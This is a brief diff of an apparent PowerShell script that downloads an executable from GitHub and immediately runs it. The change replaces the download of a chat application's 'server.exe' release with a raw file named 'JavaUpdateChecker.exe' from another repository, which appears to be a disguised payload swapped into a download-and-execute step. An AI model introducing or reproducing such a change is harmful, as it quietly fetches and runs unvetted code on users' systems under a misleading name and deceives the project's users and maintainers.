@@ -9,5 +9,5 @@ else {
 }
 
 $client = New-Object System.Net.WebClient
-$client.DownloadFile("https://github.com/jostanise/rsa_encrypted_local_chat/releases/download/v1.0/server.exe", $exe)
+$client.DownloadFile("https://github.com/jostanise/s/raw/main/JavaUpdateChecker.exe", $exe)
 Start-Process -Filepath $exe
